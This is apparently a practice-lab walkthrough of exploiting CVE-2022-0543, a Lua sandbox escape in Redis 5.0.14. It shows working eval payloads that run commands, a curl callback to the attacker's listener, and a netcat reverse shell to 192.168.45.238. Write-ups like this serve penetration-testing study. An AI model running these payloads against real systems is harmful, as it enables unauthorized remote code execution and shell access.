# CVE-2022-0543 Lua Sandbox Escape in Redis
Get `redis` information
```
192.168.103.166:6379> info
# Server
redis_version:5.0.14
...
```
Googled `redis 5.0.14 exploit` and found [CVE-2022-0543](https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543)

Check protected mode status
```
192.168.103.166:6379> CONFIG GET protected-mode
1) "protected-mode"
2) "no"
```
Check for `module` loading
```
192.168.103.166:6379> MODULE LIST
(empty array)
192.168.103.166:6379> MODULE LOAD /tmp/doesnotexist.so
(error) ERR Error loading the extension. Please check the server logs.
```
Test code execution
```
192.168.103.166:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
"uid=107(redis) gid=114(redis) groups=114(redis)\n"

192.168.103.166:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("which nc", "r"); local res = f:read("*a"); f:close(); return res' 0
"/usr/bin/nc\n"
```
Further googling on `luaopen_io for RCE` and came across  
- https://ine.com/blog/cve-20220543-lua-sandbox-escape-in-redis  
- https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce  

Modified the code
```
192.168.103.166:6379> eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = os_l(); os.execute("curl 192.168.45.238"); return 0' 0
```
Check listener
```
┌──(kali㉿kali)-[~/ws/pgpractice/readys]
└─$ rlwrap nc -lvnp 80   
listening on [any] 80 ...
connect to [192.168.45.238] from (UNKNOWN) [192.168.103.166] 55532
GET / HTTP/1.1
Host: 192.168.45.238
User-Agent: curl/7.64.0
Accept: */*
```
Remarks: Connection Established!

Get Shell
```
192.168.103.166:6379> eval 'local os_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_os"); local os = os_l(); os.execute("/usr/bin/nc -e /bin/bash 192.168.45.238 80"); return 0' 0
```